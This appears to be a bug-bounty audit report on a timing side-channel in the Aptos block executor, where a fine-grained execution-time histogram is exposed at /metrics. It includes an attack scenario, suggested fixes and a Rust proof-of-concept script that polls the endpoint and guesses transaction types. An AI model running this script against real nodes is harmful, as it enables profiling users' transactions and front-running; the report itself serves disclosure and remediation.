# Audit Report

## Title
Timing Oracle Vulnerability in TASK_EXECUTE_SECONDS Metric Exposing Transaction Type Information

## Summary
The `TASK_EXECUTE_SECONDS` histogram metric in the block executor exposes fine-grained per-task execution timing through an unauthenticated `/metrics` endpoint, enabling attackers to correlate execution times with specific transaction types for privacy analysis and MEV optimization.

## Finding Description

The `TASK_EXECUTE_SECONDS` metric records individual task execution times with microsecond granularity through 30 exponential buckets ranging from 1Î¼s to 2.147 seconds. [1](#0-0) 

This metric is recorded at the entry point of both transaction execution functions using a timer that observes the elapsed time upon dropping. [2](#0-1) [3](#0-2) 

The bucket configuration uses exponential_buckets with start=1e-6, factor=2.0, and count=30, providing fine-grained resolution. [4](#0-3) 

The metrics are exposed without authentication through the inspection service's `/metrics` endpoint. [5](#0-4) [6](#0-5) 

The service configuration allows external exposure through the `exposeMetrics` flag, which defaults to false but can be enabled. [7](#0-6) 

**Attack Scenario:**
1. Attacker continuously polls the `/metrics` endpoint (no authentication required, no rate limiting)
2. Attacker observes incremental changes in `aptos_execution_task_execute_seconds_bucket` counters
3. Different transaction types have characteristic execution times (simple transfers: microseconds, complex DeFi: milliseconds, contract deployment: longer)
4. By monitoring bucket increments and correlating with blockchain explorer data showing transaction ordering, attacker builds timing profiles
5. Privacy leak: Infer types of transactions users are performing
6. MEV opportunity: Predict execution complexity to optimize front-running strategies

## Impact Explanation

This qualifies as **Medium severity** per the Aptos bug bounty criteria as it constitutes a "Minor information leak" that enables:

**Privacy Violations:**
- Timing patterns reveal transaction complexity levels
- When combined with public blockchain data, can identify user behavior patterns
- Violates user expectations of transaction type privacy during execution

**MEV Opportunities:**
- Attackers can build statistical models of execution times for different transaction categories
- Enables optimization of transaction ordering attacks
- Provides timing advantage for front-running strategies

While this doesn't directly cause fund loss or consensus violations, it undermines transaction privacy and creates an unfair information advantage for sophisticated attackers monitoring the metrics endpoint.

## Likelihood Explanation

**High Likelihood of Exploitation:**
- No authentication barrier on `/metrics` endpoint
- No rate limiting on metric scraping
- Fine-grained buckets (30 buckets with 2x factor) provide detailed timing resolution
- Parallel execution provides noise but doesn't eliminate the signal with statistical analysis
- Low-traffic periods make correlation significantly easier
- Attack requires only HTTP polling and basic statistical analysis

The metric is always collecting data and always accessible when `exposeMetrics` is enabled, making this a persistent information leak rather than a conditional vulnerability.

## Recommendation

**Immediate Mitigation:**
1. Add authentication to the `/metrics` endpoint or limit exposure to trusted monitoring systems only
2. Implement rate limiting on metrics endpoint access
3. Default `exposeMetrics` to false in production deployments

**Long-term Solution:**
1. Replace fine-grained histogram with coarser quantile-based metrics that don't reveal per-task timing
2. Aggregate timing metrics at block level rather than task level
3. Add noise/randomization to timing observations to prevent correlation
4. Implement differential privacy techniques for timing metrics

**Code Fix Example:**
```rust
// In counters.rs - use coarser buckets or aggregate at block level
pub static BLOCK_EXECUTION_SECONDS: Lazy<Histogram> = Lazy::new(|| {
    register_histogram!(
        "aptos_execution_block_seconds",
        "Block-level execution time (aggregated)",
        exponential_buckets(/*start=*/ 1e-3, /*factor=*/ 5.0, /*count=*/ 10).unwrap(),
    )
    .unwrap()
});

// In server/mod.rs - add authentication
if req.uri().path() == METRICS_PATH {
    if !verify_metrics_token(&req) {
        return Ok(Response::builder()
            .status(StatusCode::UNAUTHORIZED)
            .body(Body::empty())
            .unwrap());
    }
    metrics::handle_metrics_request()
}
```

## Proof of Concept

**Rust Script for Timing Oracle Exploitation:**

```rust
use reqwest;
use std::collections::HashMap;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let metrics_url = "http://localhost:9101/metrics";
    let client = reqwest::Client::new();
    
    // Baseline metrics capture
    let baseline = fetch_histogram_buckets(&client, metrics_url).await?;
    println!("Baseline established: {:?}", baseline);
    
    // Wait for transaction execution
    sleep(Duration::from_secs(1)).await;
    
    // Observe changes
    let current = fetch_histogram_buckets(&client, metrics_url).await?;
    
    // Calculate delta
    for (bucket, count) in current.iter() {
        let baseline_count = baseline.get(bucket).unwrap_or(&0);
        let delta = count - baseline_count;
        if delta > 0 {
            println!("Bucket {} incremented by {}", bucket, delta);
            // Correlate with transaction types from blockchain explorer
            analyze_transaction_type(bucket);
        }
    }
    
    Ok(())
}

async fn fetch_histogram_buckets(
    client: &reqwest::Client,
    url: &str,
) -> Result<HashMap<String, u64>, Box<dyn std::error::Error>> {
    let response = client.get(url).send().await?.text().await?;
    let mut buckets = HashMap::new();
    
    for line in response.lines() {
        if line.contains("aptos_execution_task_execute_seconds_bucket") {
            // Parse bucket and count
            // Format: aptos_execution_task_execute_seconds_bucket{le="0.001"} 123
            if let Some((bucket_def, count)) = line.rsplit_once(' ') {
                buckets.insert(bucket_def.to_string(), count.parse().unwrap_or(0));
            }
        }
    }
    
    Ok(buckets)
}

fn analyze_transaction_type(bucket: &str) {
    // Statistical correlation with known transaction types
    if bucket.contains("le=\"0.000001\"") || bucket.contains("le=\"0.000002\"") {
        println!("Likely: Simple token transfer (fast execution)");
    } else if bucket.contains("le=\"0.001\"") || bucket.contains("le=\"0.002\"") {
        println!("Likely: Standard smart contract interaction");
    } else if bucket.contains("le=\"0.01\"") || bucket.contains("le=\"0.02\"") {
        println!("Likely: Complex DeFi operation or NFT mint");
    } else {
        println!("Likely: Contract deployment or very complex transaction");
    }
}
```

This PoC demonstrates how an attacker can continuously monitor the metrics endpoint and correlate bucket increments with transaction types, enabling both privacy analysis and MEV strategy optimization.

## Notes

The vulnerability is exacerbated when `exposeMetrics: true` is configured in production environments. Even with the default setting of `false`, operators may enable it for monitoring purposes without understanding the privacy implications. The parallel execution in BlockSTM provides some obfuscation but is insufficient protection against statistical analysis over time. This timing side-channel represents a fundamental trade-off between operational observability and transaction privacy that should be addressed through access controls and metric aggregation strategies.

### Citations

**File:** aptos-move/block-executor/src/counters.rs (L33-38)
```rust
fn time_buckets() -> std::vec::Vec<f64> {
    exponential_buckets(
        /*start=*/ 1e-6, /*factor=*/ 2.0, /*count=*/ 30,
    )
    .unwrap()
}
```

**File:** aptos-move/block-executor/src/counters.rs (L161-170)
```rust
pub static TASK_EXECUTE_SECONDS: Lazy<Histogram> = Lazy::new(|| {
    register_histogram!(
        // metric name
        "aptos_execution_task_execute_seconds",
        // metric description
        "The time spent in seconds for task execution in Block STM",
        time_buckets(),
    )
    .unwrap()
});
```

**File:** aptos-move/block-executor/src/executor.rs (L410-410)
```rust
        let _timer = TASK_EXECUTE_SECONDS.start_timer();
```

**File:** aptos-move/block-executor/src/executor.rs (L554-554)
```rust
        let _timer = TASK_EXECUTE_SECONDS.start_timer();
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L142-145)
```rust
        METRICS_PATH => {
            // /metrics
            // Exposes text encoded metrics
            metrics::handle_metrics_request()
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L72-76)
```rust
/// Handles a new metrics request (with text encoding)
pub fn handle_metrics_request() -> (StatusCode, Body, String) {
    let buffer = utils::get_encoded_metrics(TextEncoder::new());
    (StatusCode::OK, Body::from(buffer), CONTENT_TYPE_TEXT.into())
}
```

**File:** terraform/helm/fullnode/values.yaml (L77-78)
```yaml
  # -- Whether to expose the metrics port on fullnodes
  exposeMetrics: false
```
